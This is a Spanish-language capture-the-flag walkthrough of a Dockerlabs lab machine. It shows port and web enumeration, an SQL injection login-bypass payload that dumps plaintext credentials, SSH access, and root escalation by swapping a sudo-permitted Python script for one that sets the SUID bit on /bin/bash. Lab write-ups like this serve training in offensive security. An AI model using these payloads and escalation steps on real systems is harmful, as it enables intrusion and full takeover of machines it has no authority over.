
# Writeup Template: Maquina `[ UserSearchs ]`

- Tags: #UserSearchs
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina UserSearchs](https://mega.nz/file/4H0GRSRT#R26UHM1Simqyvz6x56JU4nuZ182qeDNSjZlO8GtchpY)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x usersearch.zip
sudo bash auto_deploy.sh usersearch.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.18.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.18.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.18.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.18.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.18.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((DebianSid))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.18.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.18.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.18.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -add-slash
```

**Hallazgos Relevantes:**
```bash
/javascript           (Status: 301) [Size: 313] [--> http://172.18.0.2/javascript/]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,pl
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 855]
/db.php               (Status: 200) [Size: 0]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que ya tenemos informacion de la base de datos, Usaremos estas credenciales para intentar nos conectar por **ssh** ya que esta expuesto este servicio.
### Ejecucion del Ataque
Tenemos esta direccion **URL** en donde nos permite buscar por usuarios, A la cual usaremos inyecciones **SQL**
```bash
admin' or 1=1-- -
```

Al ejecutar obtenemos lo siguiente:
```bash
Username: admin - Password: adminpassword
Username: user1 - Password: user1password
Username: kvzlx - Password: kvzlxpassword
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.18.0.2 && ssh kvzlx@172.18.0.2 # ( kvzlx )
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l
```

**Hallazgos Clave:**
```bash
User kvzlx may run the following commands on b97a7ea7dd54:
    (ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py # Tenemos una via potencial de migrar a root
```

### Explotacion de Privilegios

###### Usuario `[ kvzlx ]`:
Mirando el contenido del archivo: **system_info.py** vemos que emplear librerias las cuales podemos secuestrar:
```python3
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

###### Secuestrando libreria: `psutil`
Revisando la variable de entorno del usuario vemos:
```bash
echo $PATH

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Lo que aremos es crear un script malicioso en la ruta: **( /tmp )** bajo en mismo nombre de la libreria que queremos secuestrar: `psutil`
Este sera el contenido de la libreria maliciosa:
```python
import os;
os.system("chmod u+s /bin/bash")
```

Ahora modificaremos la variable de entorno para que apunte en la busqueda en la ruta: **( /tmp )** y asi ejecute nuestra libreria maliciosa:
```BASH
export PATH=/tmp:$PATH
```

**nota** al ejecutar el binario no funciono nuestro ataque:
```bash
sudo -u root /usr/bin/python3 /home/kvzlx/system_info.py
```

Intentarmeos otra tecnica que es cambiarle el nombre: **( system_info.py )** por otro 
```bash
mv system_info.py natepaga.py
```

asi mismo creamos uno con el mismo nombre: **( system_info.py )** y este tendra el mismo contenido malicioso:
```python
import os;
os.system("chmod u+s /bin/bash")
```

Una ves que tenemos el archivo falso bajo con el mismo nombre procedemos a ejecutarlo
```bash
sudo -u root /usr/bin/python3 /home/kvzlx/system_info.py
```

Listamos los permisos ahora para ver si funciono:
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Hemos tenido exito, Ahora solo tendremos que ejecutar una **bash** como **root**
```bash
bash -p
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a dumpear toda la base de datos atraves de un **SQLInjection**
2. Aprendimos a secuestrar scripts de **python**